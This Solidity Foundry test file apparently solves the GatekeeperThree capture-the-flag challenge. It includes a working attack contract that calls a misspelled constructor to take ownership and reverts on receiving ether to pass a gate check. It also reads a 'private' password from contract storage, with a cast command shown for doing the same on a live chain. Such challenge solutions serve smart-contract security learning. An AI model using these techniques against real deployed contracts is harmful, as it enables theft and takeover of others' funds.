// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GatekeeperThree, SimpleTrick} from "../GatekeeperThree.sol";

contract GatekeeperThreeTest is Test {
    GatekeeperThree gatekeeper;
    SimpleTrick simpleTrick;
    Attack attack;

    address entrant = makeAddr("entrant");

    function setUp() public {
        gatekeeper = new GatekeeperThree();
        gatekeeper.createTrick();
        attack = new Attack(gatekeeper);
        vm.deal(address(gatekeeper), 1 ether);
        simpleTrick = gatekeeper.trick();
    }
    function test_Challenge28_Passed() public {
        bytes32 password = vm.load(address(simpleTrick), bytes32(uint256(2)));
        uint256 passwordUint = uint256(password);
        // cast storage <TRICK_ADDRESS> 2 --rpc-url $RPC_URL

        gatekeeper.getAllowance(passwordUint);
        vm.prank(address(attack), entrant);
        attack.attack();
        assertEq(gatekeeper.entrant(), entrant);

    }
}

contract Attack {
    GatekeeperThree gate;
    constructor(GatekeeperThree _gate) {
        gate = _gate;
    }
    function attack() public {
        gate.construct0r();
        gate.enter();
    }
    receive() external payable {
        revert();
    }
}
